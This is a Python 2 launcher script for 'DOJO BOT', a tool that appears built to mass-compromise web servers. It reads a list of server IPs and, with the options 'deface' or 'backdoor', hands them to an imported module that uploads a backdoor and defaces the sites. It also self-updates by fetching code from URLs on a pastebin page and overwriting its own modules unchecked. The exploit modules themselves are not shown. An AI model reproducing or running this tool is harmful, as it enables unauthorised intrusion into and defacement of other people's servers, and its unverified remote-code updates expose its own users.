#!/usr/bin/py

##########################################
#     _____   ____       _  ____         #
#    |  __ \ / __ \     | |/ __ \        #
#    | |  | | |  | |    | | |  | |       #
#    | |  | | |  | |_   | | |  | |       #
#    | |__| | |__| | |__| | |__| |       #
#    |_____/ \____/ \____/ \____/        #
#                                        #
#              DOJO BOT                  #
#        FROM MASTERS TO MASTERS         #
#      Written By : Yessine Taktak       #
# Contact me : yassintaktak345@gmail.com #
# Disclaimer : I'm not responsible for   #
# any damage you make, also, remember    #
# changing rights wont make you a ' real #
# coder '.                               #
##########################################

author = "Yessine Taktak" # Do not change this ! if you want to develop this script please add your name to the set below
developers = ""
disclaimer = "First of all, changing CopyRights wont make YOU a 'coder', also, use this script anyway you want, BUT i'm not responsible for any damage you make"
import sys
import urllib2
import urllib
import os

sys.path.append(sys.path[0]+'/controls/version/')
sys.path.append(sys.path[0]+'/controls/main/')
import version
import main_script

Banner = '''
#######################################
#     _____   ____       _  ____      #
#    |  __ \ / __ \     | |/ __ \     #
#    | |  | | |  | |    | | |  | |    #
#    | |  | | |  | |_   | | |  | |    #
#    | |__| | |__| | |__| | |__| |    #
#    |_____/ \____/ \____/ \____/     #
#                                     #
#     FROM MASTERS .. TO MASTERS      #
#     Written by '''+author+'''       #
#                                     #
#######################################

Version : '''+str(version.script_v)+'''
Total vulnerabilities : '''+str(len(version.vulnerabilities))+'''
'''

# Data section #
pyv = str(sys.version.split(" ")[0].split(".")[0])+str(sys.version.split(" ")[0].split(".")[1])
# Text section #
def help():
    try:
        print '''
available options :
    update : update version
    help : show help
    deface : upload backdoor and deface
    backdoor : upload backdoor only
    list_ip : anly local file that contains a set of servers IP
        '''
        sys.exit(1);
    except:
        pass
def update():
    try:
        server = "http://pastebin.com/raw/RQR87e16"
        checker = urllib2.urlopen(server).read()
        if(checker != ""):
            new_v = checker.split("|")[2]
            if(new_v == version.script_v):
                print "You already have the latest version"
                sys.exit(1)
            print "Updating version to : "+str(new_v)
            version_link = checker.split("|")[0]
            main_link = checker.split("|")[1]
            version_data = urllib2.urlopen(version_link).read()
            main_data = urllib2.urlopen(main_link).read()
            version_file = open("controls/version/version.py", "w")
            main_file = open("controls/main/main_script.py", "w")
            version_file.write(version_data)
            main_file.write(main_data)
            print "Version updated successfully !"
        else:
            print "You already have the lastest version"
            sys.exit(1)
    except:
        print "Update failed !"
        sys.exit(1)
def checkUpdates():
    try:
        server = "http://pastebin.com/raw/RQR87e16"
        checker = urllib2.urlopen(server).read()
        if(checker != ""):
            new_v = checker.split("|")[2]
            if(new_v != version.script_v):
                print "A new version is available : "+str(new_v)+" !"
    except:
        pass
# main #
os.system('cls' if os.name == 'nt' else 'clear')
print Banner
if(pyv != "27"):
    print "This script run only on Python 2.7 pre-installed version."
    sys.exit(1)
try:
    main_script.check(author, disclaimer)
    checkUpdates()
    option = sys.argv[1]
    if(option == "deface" or option == "backdoor"):
        list_ip = sys.argv[2]
        read_data = open(list_ip).readlines()
        ips_array = []
        for data in read_data:
            data = data.rstrip()
            ips_array.append(data)
        main_script.setup(ips_array)
        main_script.start(option)
    elif(option == "help"):
        help()
    elif(option == "update"):
        update()
except:
    print "Usage : "+str(sys.argv[0])+" <option> list_ip"
    sys.exit(1);
